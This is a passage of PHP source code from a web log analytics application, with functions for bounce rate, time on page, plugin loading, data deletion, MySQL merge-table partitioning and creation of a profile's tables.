    $bounce_rate = $bounce_visitors / $total_visitors * 100;
    
    $data=array();
    $data['total'] = $total_visitors;
    $data['stayed'] = $stay_visitors;
    $data['bounced'] = $bounce_visitors;
    $data['rate'] = $bounce_rate;
    
    // clean up temp table
    $db->Execute("drop temporary table goodtimes");   
    
    return $data;       
}

function TimeOnPage($page) {
    global $db, $profile, $from, $to;
    /**
    * @desc This function will calculate the average time spent on a particular page, 
    * not counting people who bounced (had no further requests)
    * @returns average timespent on page in seconds
    */    

    // first find the visitorid and timestamp of the request we're interested in.
    $query="CREATE TEMPORARY TABLE goodtimes ";
    $query.="SELECT sessionid,min(timestamp) AS timestamp from $profile->tablename ";
    $query.="WHERE (timestamp >=$from and timestamp <=$to) ";
    $query.="AND url='".getID($page,"urls")."' AND crawl='0' ";
    $query.="GROUP BY sessionid";   
    
    // get the visitorid and timestamp of the request that came after the one we're interested in     
    $query2="INSERT INTO goodtimes ";
    $query2.="SELECT sessionid,min(timestamp) AS timestamp from $profile->tablename ";
    $query2.="WHERE (timestamp >=$from and timestamp <=$to) ";
    $query2.="AND referrer='".getID("http://$profile->confdomain".$page,"referrers")."' ";
    $query2.="AND crawl='0' ";
    $query2.="GROUP BY sessionid"; 
    
    // now create a tempoary table to hold the difference between the two timestamps
    $query3="CREATE TEMPORARY TABLE pagetime ";
    $query3.="SELECT (max(timestamp)-min(timestamp)) AS duration, sessionid ";
    $query3.="FROM goodtimes GROUP BY sessionid";
    
    // get rid of the ones that have no time
    $query4="DELETE from pagetime WHERE duration=0";
    
    // now calculate an average duration
    $query5="SELECT avg(duration) AS avgduration FROM pagetime";
    
    // echo $query."<p>".$query2."<p>".$query3."<p>".$query4."<p>".$query5;
    // issue the queries and get the data
    $db->Execute($query);
    $db->Execute($query2);
    $db->Execute($query3);
    $db->Execute($query4);
    $result = $db->Execute($query5); 
    $avg_duration = $result->FetchRow();
    
    // clean up temp tables (so we can do this more than once in a single script)
    $db->Execute("drop temporary table goodtimes");
    $db->Execute("drop temporary table pagetime");
    
    return $avg_duration['avgduration'];       
}

// this function is obsolete and has been replaced by BounceVisitors 
function BounceRate($archivename) {  
    global $db, $profile, $from, $to;
    //make the temp table
    
    if (($bounce_rate = getProfileData($profile->profilename, "$profile->profilename.bounce.$archivename",0)) && $archivename!="redo") {
        //echo "getting from memory";
        //return $bounce_rate;
    } else {
    
        $start=time();
        $tn=$profile->tablename  . "_bouncecalc";
        $query = "drop table if exists $tn";
        $db->Execute($query);
        //$query = "create temporary table $tn (visitorid char(32), hits int(11))";
        $query = "create table $tn (visitorid char(32), hits int(11)) ENGINE=MyISAM CHARSET=utf8";
        //echo "<br>$query<br>"; 
        $db->Execute($query);
        $query = "insert into $tn select visitorid, count(*) from $profile->tablename where timestamp >=$from and timestamp <=$to and crawl=0 group by visitorid";
        //echo "<br>$query<br>"; 
        $result = $db->Execute($query);
        
        $query = "select count(*) from $tn";    
        $result = $db->Execute($query); 
        $total_visitors = $result->FetchRow();
        $total_visitors = $total_visitors[0];
        
        $query = "select count(*) from $tn where hits=1";
        //echo "<br>$query<br>"; 
        $result = $db->Execute($query);
        $bounce_visitors = $result->FetchRow();
        $bounce_visitors = $bounce_visitors[0];
        $bounce_rate = @(($bounce_visitors / $total_visitors) * 100);
        echo "$bounce_rate = ($bounce_visitors / $total_visitors) * 100";
        //$query = "drop temporary table if exists $tn";
        $query = "drop table if exists $tn";
        $db->Execute($query);
        if ($archivename!="redo") {
            setProfileData($profile->profilename, "$profile->profilename.bounce.$archivename",$bounce_rate);
        }
    }
    return number_format($bounce_rate,2);
}

function SecurityCheck($input) {
    $checkcnf=urldecode($input);
    if (strpos($checkcnf," ") !== FALSE) {
        echo "Security failure: exiting (Invalid characters found)";
        exit();
    }
    if (strpos($checkcnf,"\"") !== FALSE) {
        echo "Security failure: exiting (Invalid characters found)"; 
        exit();
    }
    if (strpos($checkcnf,"'") !== FALSE) {
        echo "Security failure: exiting (Invalid characters found)";
        exit();
    }
    if (strpos($checkcnf,"<") !== FALSE) {
        echo "Security failure: exiting (Invalid characters found)";
        exit();
    }
	if (strpos($checkcnf,"{") !== FALSE) {
        echo "Security failure: exiting (Invalid characters found)";
        exit();
    }
	if (strpos($checkcnf,";") !== FALSE) {
        echo "Security failure: exiting (Invalid characters found)";
        exit();
    }
}

//this one is old
function DisplayPlugin($position) {
    global $profile,$todaysdate,$from,$to,$data;
    $drilldown="";
    $filter="";
    if ($handle = @opendir("plugins/$profile->profilename/")) {  
        while ($file = readdir($handle)) {
            if ($file[0] != '.') {
                 $checkplugin=file_get_contents("plugins/$profile->profilename/$file");
                 if (strpos($checkplugin,"Position=$position")!=FALSE) {
                    include("plugins/$profile->profilename/$file");
                 }
            }
        }
    }
}

//this one is new
function DisplayPlugins($startlabel) {
    global $profile,$todaysdate,$from,$to,$divlabels,$jscommands;

    if ($handle = @opendir("plugins/$profile->profilename/")) {  
        while ($file = readdir($handle)) {
            if ($file[0] != '.') {
                 //$checkplugin=file_get_contents("plugins/$profile->profilename/$file");
                 //if (strpos($checkplugin,"Position=$position")!=FALSE) {
                 //   include("plugins/$profile->profilename/$file");
                 //}
                 $divlabels[$startlabel]="plugin".$startlabel;
                 echo "<div id=\"$divlabels[$startlabel]\" class=\"todayreports\" style=\"width:600px;\">";  
                 echo "Getting Plugin";
                 echo "</div>";
                 //echo ("<a href=\"plugins/$profile->profilename/$file?to=$to&from=$from&todaysdate=$todaysdate\">link</a>");
                 //echo "<script language=\"javascript\"> AjaxGet('plugins/$profile->profilename/$file?to=$to&from=$from&todaysdate=$todaysdate', '$divlabels[$startlabel]');  </script>"; 
                 $jscommands.= "  AjaxGet('plugins/$profile->profilename/$file?to=$to&from=$from&todaysdate=$todaysdate', '$divlabels[$startlabel]');"; 
                 @$startlabel++;
                 
            }
        }
    }
}

function get_month_lastday ($month_num = FALSE, $year = FALSE) {
    // $month_num = month in two-digit form
    //   leave blank for current month
    // $year = year in four-digit form
    //   leave blank for current year

    // Set the proper month (current if non passed)
    $month_num = ($month_num) ? $month_num : date('m') ;
    $year = ($year) ? $year : date('Y') ;

    // return the last day of the requested month
    $d =  date('d', strtotime('-1 second',
            strtotime('+1 month', 
            strtotime($month_num.'/01/'.$year.' 00:00:00'))));
    return intval($d);
}

function DeleteRange($delprofile,$what) {
    global $db, $from, $to;
    /*
		what = 1: only delete detail data from main table
		what = 2: delete all
		what = 3: only delete from summary tables
    */
    if (($what==1) || ($what == 2)) {
        $db->Execute("delete from $delprofile->tablename where timestamp >=$from and timestamp <=$to");
        echo _DELETED_DETAIL_DATA_IN_DATE_RANGE."<br>";
    }
	
    if ($what==2 || ($what==3)) {
        $db->Execute("delete from $delprofile->tablename_vpm where timestamp >=$from and timestamp <=$to");
        $db->Execute("delete from $delprofile->tablename_vpd where timestamp >=$from and timestamp <=$to");
        $db->Execute("delete from $delprofile->tablename_dailyurls where timestamp >=$from and timestamp <=$to");
        $db->Execute("delete from $delprofile->tablename_conversions where timestamp >=$from and timestamp <=$to");
        $db->Execute("delete from $delprofile->tablename_screenres where timestamp >=$from and timestamp <=$to");
        $db->Execute("delete from $delprofile->tablename_colordepth where timestamp >=$from and timestamp <=$to");
        echo _DELETED_SUMMARY_DATA_IN_DATE_RANGE;
    }
	
    deleteProfileData($delprofile->profilename, "cache\_%");
	deleteProfileData($delprofile->profilename, $delprofile->tablename."%\_cachearray");
	deleteProfileData($delprofile->profilename, $delprofile->profilename.".cache\_%");
	deleteProfileData($delprofile->profilename, $delprofile->profilename."cache_trail");
	deleteProfileData($delprofile->profilename, "lastlogpos.%");
	deleteProfileData($delprofile->profilename, "firstlogline.%");
	deleteProfileData($delprofile->profilename, "1stlogline.%");
	deleteProfileData($delprofile->profilename, "lastknownpos.%");
	
	$bandwidth_data = getProfileData($delprofile->profilename, $delprofile->profilename.".bandwidthData", '');
	if(!empty($bandwidth_data)) {
		$bandwidth_data = unserialize($bandwidth_data);
		foreach($bandwidth_data as $key => $val) {
			if(intval(date('Ymd', $from).'00') >= $key && $key <= intval(date('Ymd', $to).'23')) {
				unset($bandwidth_data[$key]);
			}
		}
		
		$bandwidth_data = serialize($bandwidth_data);
		setProfileData($delprofile->profilename, $delprofile->profilename.".bandwidthData", $bandwidth_data);
	}
}

function getField($table) {
    // returns the appropriate field to use with table
    switch ($table) {
        case "urls":
            $field="url";
            break;
        case "urlparams":
            $field="params";
            break;
        case "keyword":
            $field="keywords";
            break;
        case "referrers":
            $field="referrer";
            break;
        case "refparams":
            $field="params";
            break;
        case "useragents":
            $field="useragent";
            break;
    }
    return $field;
}

function getID($item,$table) {
    /* returns the ID of the item in the table    
    */
    global $db, $profile; 
    
    $field = getField($table);    
    
    $query = "select id from ".$profile->tablename."_$table where $field=".$db->quote(substr($item,0,255));
    // echo $query;
    $result = $db->Execute($query);
    if ($data = $result->FetchRow()) {
		//print_r($data);
		return $data['id'];
    } else {
        return false;
    }        
}

function InsertOrGetID($item,$table,$method="") {
    // find or insert the item.
    global $db, $profile, $timetracking;
    
    $starttime=getmicrotime();
    
    // get the field we need
    $field = getField($table);
    
    // make the item safe for database insert
    $item = $db->quote(substr($item,0,255));
    
    if ($method=="duplicate") {
        // this way is probably faster, but it's buggy on some mysql version AND we can't do this if we have merge tables
        $db->Execute("INSERT INTO ".$profile->tablename."_$table ($field) VALUES ($item) ON DUPLICATE KEY UPDATE id=LAST_INSERT_ID(id)"); 
        $id = $db->Insert_ID();
        $stoptime=getmicrotime();
        @$timetracking[$table]+=$stoptime-$starttime;
        return $id;            
    }
        
    $id = getID($item,$table);
    if ($id===false) {
        $db->Execute("Insert into ".$profile->tablename."_$table ($field) values ($item)");
        $id = $db->Insert_ID();
    }
    $stoptime=getmicrotime();
    @$timetracking[$table]+=$stoptime-$starttime;  
    return $id;
}

function echoDebug($string, $stay = false) {
	global $debug, $errorHandler;
	
	$extra_classes = "";
	if($stay == true) { $extra_classes .= " error"; }
	
	if(!empty($debug)) {
		ob_start();
		$errorHandler->showBacktrace();
		$callstack = ob_get_clean();
		echo "<div class=\"debug{$extra_classes}\">&nbsp; <div class='mysql_debug'>{$string}</div>{$callstack}</div>";
		echo "<script type='text/javascript'>debugToConsole('');</script>";
	}
}
function echoWarning($string,$style="") {
    echo Warning($string,$style);
}
function Warning($string,$style="") {
    return "<div class=\"warning ui-state-error ui-corner-all\" style=\"$style\">$string</div>";
}
function echoNotice($string,$style="") {
    echo Notice($string,$style);
}
function Notice($string,$style="") {
    return "<div class=\"warning ui-state-highlight ui-corner-all\" style=\"$style\">$string</div>";
}

function sNotice($string,$style="") {
    return "<span class=\"ui-state-highlight ui-corner-all\" style=\"padding:2px;$style\">$string</span>";
}
function sWarning($string,$style="") {
    return "<span class=\"ui-state-error ui-corner-all\" style=\"padding:2px;$style\">$string</span>";
}

function echoButton($url,$anchor,$style="") {
    echo "<a class=\"extrabuttons ui-state-default ui-corner-all\" style=\"$style\" href=\"$url\">$anchor</a>";   
}
function Button($url,$anchor,$style="") {
    return "<a class=\"extrabuttons ui-state-default ui-corner-all\" style=\"$style\" href=\"$url\">$anchor</a>";   
}
function echoJavascript($string) {
    echo "<script type=\"text/javascript\">$string</script>";   
}
function echoFooter($string) {
    echo "<div id=\"footer\" align=\"center\" style=\"clear:both;padding-top:50px;font-size:8px;color:silver;\">$string</div>";   
}


function ArchiveAndMergeTable($table) {
    /**
    * @desc This function will take a table, create a copy, create an empty duplicate and 
    * create a merge table that holds them both. It might also try to archive/zip 
    * the copy of the original table
    * @return Returns true on success or if it's already been done, false if something went wrong
    */    
    global $db, $profile;
    
    // lets set up some table names
    $archivetable = $table."_archive";
    $currenttable = $table."_current";
    
    // we are only going to do this if it hasn't already been done, so lets check for that.
    $meta_tables = $db->MetaTables();
    if (in_array_insensitive($archivetable, $meta_tables)) {
        // nothing to do, return true cus it's done
        echoWarning("Table $archivetable already exists, so there is nothing to do.");
        return true;
    }
        
    // first lets get the create table query from the original table
    $query  = "SHOW CREATE TABLE $table";
    $q= $db->Execute($query);
    if ($data = $q->FetchRow()) {
        $createtable = $data['Create Table'];    
    } else {
        echoDebug("error for query: $query");
        return false;  
    }
    //echoDebug("this is out template: $createtable");
    
    // now get the last id used so we can tell the new table to keep going from there
    if (strpos($createtable,"AUTO_INCREMENT")!==false) {
		$query  = "select id from $table order by id desc limit 1";
		$q= $db->Execute($query);
		if ($data = $q->FetchRow()) {
			$lastid=$data['id'];    
		} else {
			echoDebug("error for query: $query");
			return false;   
		}
		echo("the last id found is $lastid ... ");
	}
    
    // we're gonna rename the table now .... 
    $db->Execute("ALTER TABLE $table RENAME TO $archivetable");
    echoNotice("Renaming table $table to $archivetable .... done");
    
    // now we create a new, empty table
    $query = str_replace("`$table`","`$currenttable`",$createtable);
    $db->Execute($query);
    
    // if we have an auto increment field, we have to set the start value
    if (strpos($createtable,"AUTO_INCREMENT")!==false) {                                             
        $db->Execute("ALTER TABLE $currenttable AUTO_INCREMENT = $lastid");
    }
    echoNotice("Created a new table: $currenttable with structure:<br><pre>$query</pre>");
    
    // now lets create the merge table with the original tablename
    $query = $createtable;
    if (strpos($createtable,"PRIMARY KEY")!==false) {
        // we found a primary key and we can't have that in the merge table, so let's try to turn it into a normal index
        $query = str_replace("PRIMARY KEY","INDEX",$query);           
    }
    if (strpos($createtable,"UNIQUE KEY")!==false) {
        // no unique key allowed either
        $query = str_replace("UNIQUE KEY","INDEX",$query);           
    }
    $query = str_replace("ENGINE=MyISAM","ENGINE=MERGE UNION=($archivetable,$currenttable) INSERT_METHOD=LAST",$query);
    $db->Execute($query);
    echoNotice("Created new merge table: $table with structure:<br><pre>$query</pre>");
    echoWarning("Next, using a command line console (on *nix), you should pack the table like this:<br><b>myisampack $archivetable.MYI<br>myisamchk -rq --sort-index --analyze $archivetable.MYI</b><br>");
    return true;
}

function explodeTargets($targetfiles) {
    /**
    * @desc This will create an array with target files.
    * If there are any entries with wildcards, we'll query 
    * the database and add the variations
    */
    global $profile,$db;
    $targets=explode(",",$targetfiles);
    $tarray = array();
    $i=0;
    $w=0;
    foreach ($targets as $thistarget) {
        $thistarget = trim($thistarget);
        if (strpos($thistarget,"*")!==FALSE) {
            // we have a wildcard, lets add all the variations later
            $wildcard[$w]=$thistarget;
            $w++;   
        } else {
            $tarray[$i] = $thistarget;
            $i++; 
        }           
    }
    if (isset($wildcard)) {
        foreach ($wildcard as $thistarget) {
            $query = "select url from $profile->tablename_urls where url like '".str_replace("*","%",$thistarget)."' limit 10";
            $q = $db->Execute($query);
            while ($data = $q->FetchRow()) {
                $tarray[$i] = $data['url'];
                //echo $data['url'];
                $i++;
            }               
        }           
    }
    return $tarray;
}

function PrettyDate($time) {
    return date("D, d M Y / H:i",$time);    
}

function PrintLoadingBox($what="") {
    global $from, $to, $labels;
    if ($labels!="") {
        $what=$labels;   
    }
    $nicefrom = PrettyDate($from);
    $niceto = PrettyDate($to);
    ?>    
    <div id="loading" style="position:absolute;left:177px;top:149px;visibility:visible;z-index:11;">
    <TABLE bgcolor=white cellspacing=0 cellpadding=3 width="340">
    <TR><TD class=MoveableToplinegreen><FONT size="+1"><?php echo _BUILDING_REPORT?></FONT></TD></TR>
    <TR><TD bgcolor="#f0f0f0" class=dotline valign=middle><IMG src="images/Hourglass_icon.gif" width=32 height=32 alt="" border="0" align=left vspace=4 hspace=4>
    <?php echo _WAIT_WHILE_REPORT_IS_BEING_CREATED?><BR>
    <?php echo _NOW_CALCULATING?> <b><?php if(defined($what)) { echo constant($what); } else { echo $what; } echo "</b> "._DATE_FROM."<br>$nicefrom "._DATE_TO." $niceto"; ?>
    </TD></TR>
    </TABLE>
    </div>
    <script type="text/javascript">     
    $("#loading").draggable();
    </script>    
    <?php
    flush(); 
}

/**
* @desc This function will create a mysql merge table with the correct underlying tables based on the input parameters
* @params the $from timestamp and a $to timestamp 
*/
function createMergeTable($from,$to) {
    global $profile,$db;
    
    $pos = date("Ym",$from);
    $end = date("Ym",$to);
    $tables="";
    
    while ($pos <= $end) {
        $tablename = $profile->tablename."_p_".$pos;        
        $tables.=$tablename.",";         
        if (substr($pos,-2)>=12) {
            $pos=$pos+89;
        } else {
            $pos++;    
        }            
    }
    $tables = substr($tables,0,-1);
    
    if ($_SESSION[$profile->tablename]['merge_data']==$tables) {
        # we already have this merge table
        return;    
    }
    
    # build the table
    $query  = "SHOW CREATE TABLE $tablename";
    $q= $db->Execute($query);
    if ($data = $q->FetchRow()) {
        $createtable = $data['Create Table'];    
    } else {
        echoDebug("error for query: $query");
        return false;  
    }
    
    $query = str_replace("`$tablename`","`$profile->tablename`",$createtable);
    $query = str_replace("ENGINE=MyISAM","ENGINE=MERGE UNION=($tables) INSERT_METHOD=LAST",$query);         

    echoDebug($query);
    $db->Execute("drop table if exists $profile->tablename");
    $db->Execute($query);
    
    $_SESSION[$profile->tablename]['merge_data']=$tables;
    
}

/**
* @desc This function will chop the main data table into multiple smaller tables, one for each month
*/
function chopDataTables() {
    global $profile,$db;
    
    # first get the date range
    $range=GetMaxDateRange($profile);
    
    # now build a tablename for each month in that range
    $tables = array();
    $curtime = $range['from'];
    while ($curtime < $range['to']) {
        $tablename = $profile->tablename."_p_".date("Ym",$curtime);
        if (!in_array($tablename,$tables)) {
            $tables[]=$tablename;                        
        }
        $curtime=$curtime+86400;
    }
        
    # now fill the month tables with data
    set_time_limit(86400);
    ob_start();
    foreach ($tables as $target) {
        $q = "CREATE TABLE $target LIKE $profile->tablename";
        $db->Execute($q);
        echo "<hr>".$q."<br>"; lgflush();
        
        $q = "ALTER TABLE $target DISABLE KEYS";
        $db->Execute($q);
        echo "<hr>".$q."<br>"; lgflush(); 
        
        $q = "INSERT INTO $target SELECT * FROM $profile->tablename where from_unixtime(timestamp, '%Y%m')=".substr($target,-6);
        $db->Execute($q);
        echo "<hr>".$q."<br>"; lgflush();
        
        $q = "ALTER TABLE $target ENABLE KEYS";
        $db->Execute($q);
        echo "<hr>".$q."<br>"; lgflush(); 
         
    }
    $db->Execute("rename table $profile->tablename to {$profile->tablename}_original");  
    
}

function deleteDataTable(&$profile) {
    global $databasedriver, $db; 
    @$db->Execute("drop table $profile->tablename");
    @$db->Execute("drop table $profile->tablename_vpd");
    @$db->Execute("drop table $profile->tablename_vpm");
    @$db->Execute("drop table $profile->tablename_dailyurls");
    @$db->Execute("drop table $profile->tablename_conversions");
    @$db->Execute("drop table $profile->tablename_urls");
    @$db->Execute("drop table $profile->tablename_urlparams");
    @$db->Execute("drop table $profile->tablename_referrers");
    @$db->Execute("drop table $profile->tablename_refparams");
    @$db->Execute("drop table $profile->tablename_keywords");
    @$db->Execute("drop table $profile->tablename_visitorids");
    @$db->Execute("drop table $profile->tablename_sessionids");
    @$db->Execute("drop table $profile->tablename_screenres");
    @$db->Execute("drop table $profile->tablename_colordepth");
    @$db->Execute("drop table $profile->tablename_useragents");
	$tables = $db->Execute("show tables like '{$profile->tablename}\_%'");
    while ($table=$tables->FetchRow()) {
		$db->Execute("drop table {$table[0]}");
	}
}    

/**
* Create the table structure for the profile table.
* @param SiteProfile The profile to update.
*/     
function createDataTable(&$profile) {
    global $databasedriver, $db;
      

    // $checklimits = "Select profilename from ".TBL_PROFILES;
    // $checklimitsresult = $db->Execute($checklimits) or die(_COULDNT_QUERY_PROFILES.". " . $db->ErrorMsg());
    // if (defined("_LIMIT_PROFILES") != 0) {
          // if ($checklimitsresult->RecordCount() > _LIMIT_PROFILES) {
             // echo "<font color=\"red\">"._TOO_MANY_PROFILES."</font><br>";
              // exit();           
          // }
    // }

  // Check and see if we need to create the table.
  $tablelist = $db->MetaTables();
  $tablename = $profile->tablename;
  
  
  if (!in_array_insensitive($tablename, $tablelist)) {
        $tabcreate ="CREATE TABLE $tablename (".
                //"id ". (($databasedriver != "sqlite") ? "int(10) NOT NULL auto_increment" : "integer primary key") . ", ".
                //"ipnumber varchar(16) NOT NULL default '0', ".  //move ipnumber to visitors table
                //"visitorid char(32), ".
                "timestamp int(11) NOT NULL default '0',    ".
                "visitorid int(11), ".
                "url int(11),    ".
                "params int(11),    ".
                "status smallint(3) NOT NULL default 0,    ".
                "bytes int(20) NOT NULL default 0,    ".
                "referrer int(11),    ".
                "refparams int(11),    ".
                //"authuser varchar(80), ". //move this to new visitors table
                //"useragentid integer,    ".
                "useragentid int(11),    ".
                "keywords int(11),    ".
                //"country varchar(75) default '',    ".
                "country char(3) default '',    ".
                "crawl int(1) NOT NULL default '0', ".
                "sessionid int(11) ".
                //(($databasedriver != "sqlite") ? ", PRIMARY KEY (id)" : "").
                ") ENGINE=MyISAM CHARSET=utf8";
        //if ($databasedriver == "mysql") { $tabcreate .= " ENGINE=MyISAM PACK_KEYS=1"; }
        $db->Execute($tabcreate);
        if ($databasedriver == "mysql") {
            $index_name_pre = "";
            $db->Execute("ALTER TABLE ".$tablename." ADD INDEX ".$index_name_pre."timestamp (timestamp)");
            $db->Execute("ALTER TABLE ".$tablename." ADD INDEX ".$index_name_pre."visitorid (visitorid)");
            $db->Execute("ALTER TABLE ".$tablename." ADD INDEX ".$index_name_pre."url (url)");
            $db->Execute("ALTER TABLE ".$tablename." ADD INDEX ".$index_name_pre."referrer (referrer)");
            $db->Execute("ALTER TABLE ".$tablename." ADD INDEX ".$index_name_pre."keywords (keywords)");
        } else {
            $index_name_pre = $tablename . "_";
            $db->Execute("CREATE INDEX ".$index_name_pre."timestamp ON ".$tablename."(timestamp)");
            $db->Execute("CREATE INDEX ".$index_name_pre."visitorid ON ".$tablename."(visitorid)");
            $db->Execute("CREATE INDEX ".$index_name_pre."url ON ".$tablename."(url)");
            $db->Execute("CREATE INDEX ".$index_name_pre."referrer ON ".$tablename."(referrer)");
            $db->Execute("CREATE INDEX ".$index_name_pre."keywords ON ".$tablename."(keywords)");
        }
                                                 
        //$db->Execute("CREATE INDEX ".$index_name_pre."ipnumber ON ".$tablename."(ipnumber)");
        
    }
          
    //create summaries now in stead of in updatesummaries.php
    $meta_tables = $db->MetaTables();
    //print_r ($meta_tables);
    
     //create the tracker storage table 
    if ($profile->trackermode==1) {
       //$db->Execute("CREATE TABLE if not exists $profile->tablename_trackerlog (logline TEXT default NULL)");
       
       $db->Execute("CREATE TABLE if not exists $profile->tablename_trackerlog (".
            "id ". (($databasedriver != "sqlite") ? "int(11) NOT NULL auto_increment" : "integer primary key") . ", ".
            "logline TEXT default NULL".
            (($databasedriver != "sqlite") ? ", PRIMARY KEY (id)" : "").
        ") ENGINE=MyISAM CHARSET=utf8");
            
    }
    

    if (!in_array_insensitive($profile->tablename_vpd, $meta_tables)) {
        $db->Execute("CREATE TABLE $profile->tablename_vpd (
            timestamp int(11) NOT NULL default '0',
            days char(25) default NULL,
            visitors bigint(100) NOT NULL default '0',
            pages bigint(100) NOT NULL default '0',
            visits bigint(100) NOT NULL default '0'
            ) ENGINE=MyISAM CHARSET=utf8");
    }

    if (!in_array_insensitive($profile->tablename_vpm, $meta_tables)) {
        $db->Execute("CREATE TABLE $profile->tablename_vpm (
            timestamp int(11) NOT NULL default '0',
            month char(20) default NULL,
            visitors bigint(100) NOT NULL default '0',
            pages bigint(100) NOT NULL default '0',
            visits bigint(100) NOT NULL default '0'
        ) ENGINE=MyISAM CHARSET=utf8");
    }

    if (!in_array_insensitive($profile->tablename_dailyurls, $meta_tables)) {
        //echo "Dailyurls tablename=$profile->tablename_dailyurls";
        $db->Execute("CREATE TABLE $profile->tablename_dailyurls (
            timestamp int(11) NOT NULL default '0',
            days char(25) default NULL,
            visitors bigint(100) NOT NULL default '0',
            url int(11) NOT NULL,
            referrer int(11)
        ) ENGINE=MyISAM CHARSET=utf8");
        if ($databasedriver == "mysql") {
            $db->Execute("ALTER TABLE {$profile->tablename_dailyurls} ADD INDEX {$profile->tablename_dailyurls}_referrer (referrer)");
            $db->Execute("ALTER TABLE {$profile->tablename_dailyurls} ADD INDEX {$profile->tablename_dailyurls}_url (url)");
        } else {
            $db->Execute("CREATE INDEX {$profile->tablename_dailyurls}_referrer on {$profile->tablename_dailyurls}(referrer)");
            $db->Execute("CREATE INDEX {$profile->tablename_dailyurls}_url on {$profile->tablename_dailyurls}(url)");
        }
        
    }

   if (!in_array_insensitive($profile->tablename_conversions, $meta_tables)) {
        $db->Execute("CREATE TABLE $profile->tablename_conversions (
            timestamp int(11) NOT NULL default '0',
            visitorid varchar(32) NOT NULL default '0',
            url int(11) NOT NULL default '0'
        ) ENGINE=MyISAM CHARSET=utf8");
        if ($databasedriver == "mysql") {
            $db->Execute("ALTER TABLE {$profile->tablename_conversions} ADD INDEX {$profile->tablename_conversions}_timestamp (timestamp)");
        } else {
            $db->Execute("CREATE INDEX {$profile->tablename_conversions}_timestamp on {$profile->tablename_conversions}(timestamp)");
        }
        
    }
    
    if (!in_array_insensitive($profile->tablename_urls, $meta_tables)) {
        $db->Execute("CREATE TABLE $profile->tablename_urls (".
            "id ". (($databasedriver != "sqlite") ? "int(11) NOT NULL auto_increment" : "integer primary key") . ", ".
            "url varchar(255) NOT NULL default '0',".
            "title varchar(255) default ''".
            (($databasedriver != "sqlite") ? ", PRIMARY KEY (id)" : "").
        ") ENGINE=MyISAM CHARSET=utf8");
        if ($databasedriver == "mysql") {
            $db->Execute("ALTER TABLE {$profile->tablename_urls} ADD UNIQUE INDEX {$profile->tablename_urls}_url (url)");
        } else {
            $db->Execute("CREATE UNIQUE INDEX {$profile->tablename_urls}_url on {$profile->tablename_urls}(url)");
        }
        
		// $db->Execute("ALTER TABLE {$profile->tablename_urls} ADD COLUMN `hash` CHAR(32)");
		// $db->Execute("UPDATE {$profile->tablename_urls} SET `hash` = MD5('url')");
		// $db->Execute("ALTER TABLE {$profile->tablename_urls} ADD INDEX (hash)");
    }
    if (!in_array_insensitive($profile->tablename_urlparams, $meta_tables)) {
        $db->Execute("CREATE TABLE $profile->tablename_urlparams (".
            "id ". (($databasedriver != "sqlite") ? "int(11) NOT NULL auto_increment" : "integer primary key") . ", ".
            "params varchar(255) default ''".
            (($databasedriver != "sqlite") ? ", PRIMARY KEY (id)" : "").
        ") ENGINE=MyISAM CHARSET=utf8");                                          
        if ($databasedriver == "mysql") {
            $db->Execute("ALTER TABLE {$profile->tablename_urlparams} ADD UNIQUE INDEX {$profile->tablename_urlparams}_params (params)");
        } else {
            $db->Execute("CREATE UNIQUE INDEX {$profile->tablename_urlparams}_params on {$profile->tablename_urlparams}(params)");
        }
		
		// $db->Execute("ALTER TABLE {$profile->tablename_urlparams} ADD COLUMN `hash` CHAR(32)");
		// $db->Execute("UPDATE {$profile->tablename_urlparams} SET `hash` = MD5('params')");
		// $db->Execute("ALTER TABLE {$profile->tablename_urlparams} ADD INDEX (hash)");
    }
    
    if (!in_array_insensitive($profile->tablename_referrers, $meta_tables)) {
        $db->Execute("CREATE TABLE $profile->tablename_referrers (".
            "id ". (($databasedriver != "sqlite") ? "int(11) NOT NULL auto_increment" : "integer primary key") . ", ".
            "referrer varchar(255) NOT NULL default '0'".
            (($databasedriver != "sqlite") ? ", PRIMARY KEY (id)" : "").
        ") ENGINE=MyISAM CHARSET=utf8");
        if ($databasedriver == "mysql") {
            $db->Execute("ALTER TABLE {$profile->tablename_referrers} ADD UNIQUE INDEX {$profile->tablename_referrers}_referrer (referrer)");
        } else {
            $db->Execute("CREATE UNIQUE INDEX {$profile->tablename_referrers}_referrer on {$profile->tablename_referrers}(referrer)");
        }
        
		// $db->Execute("ALTER TABLE {$profile->tablename_referrers} ADD COLUMN `hash` CHAR(32)");
		// $db->Execute("UPDATE {$profile->tablename_referrers} SET `hash` = MD5('referrer')");
		// $db->Execute("ALTER TABLE {$profile->tablename_referrers} ADD INDEX (hash)");
    }
    if (!in_array_insensitive($profile->tablename_refparams, $meta_tables)) {
        $db->Execute("CREATE TABLE $profile->tablename_refparams (".
            "id ". (($databasedriver != "sqlite") ? "int(11) NOT NULL auto_increment" : "integer primary key") . ", ".
            "params varchar(255) default '',".
			"`hash` CHAR(32)".
            (($databasedriver != "sqlite") ? ", PRIMARY KEY (id)" : "").
        ") ENGINE=MyISAM CHARSET=utf8");
        if ($databasedriver == "mysql") {
            $db->Execute("ALTER TABLE {$profile->tablename_refparams} ADD UNIQUE INDEX {$profile->tablename_refparams}_params (params)");
        } else {
            $db->Execute("CREATE UNIQUE INDEX {$profile->tablename_refparams}_params on {$profile->tablename_refparams}(params)");
        }
        
		// $db->Execute("ALTER TABLE {$profile->tablename_refparams} ADD INDEX (hash)");
    }
    if (!in_array_insensitive($profile->tablename_keywords, $meta_tables)) {
        $db->Execute("CREATE TABLE $profile->tablename_keywords (".
            "id ". (($databasedriver != "sqlite") ? "int(11) NOT NULL auto_increment" : "integer primary key") . ", ".
            "keywords varchar(255) default '',".
			"`hash` CHAR(32)".
            (($databasedriver != "sqlite") ? ", PRIMARY KEY (id)" : "").
        ") ENGINE=MyISAM CHARSET=utf8");
        if ($databasedriver == "mysql") {
            $db->Execute("ALTER TABLE {$profile->tablename_keywords} ADD UNIQUE INDEX {$profile->tablename_keywords}_keywords (keywords)");
        } else {
            $db->Execute("CREATE UNIQUE INDEX {$profile->tablename_keywords}_keywords on {$profile->tablename_keywords}(keywords)");
        }
        
		// $db->Execute("ALTER TABLE {$profile->tablename_keywords} ADD INDEX (hash)");
    }

    if (!in_array_insensitive($profile->tablename_visitorids, $meta_tables)) {
        $db->Execute("CREATE TABLE $profile->tablename_visitorids (".
            "id ". (($databasedriver != "sqlite") ? "int(11) NOT NULL auto_increment" : "integer primary key") . ", ".
            "visitorid varchar(32) NOT NULL default '0',".
            "ipnumber varchar(255) NOT NULL default '0', ". 
            "authuser varchar(80), ".
            "created int(11) NOT NULL default '0', ".
            "customlabel varchar(80) NOT NULL default '',".
			"`hash` CHAR(32)".
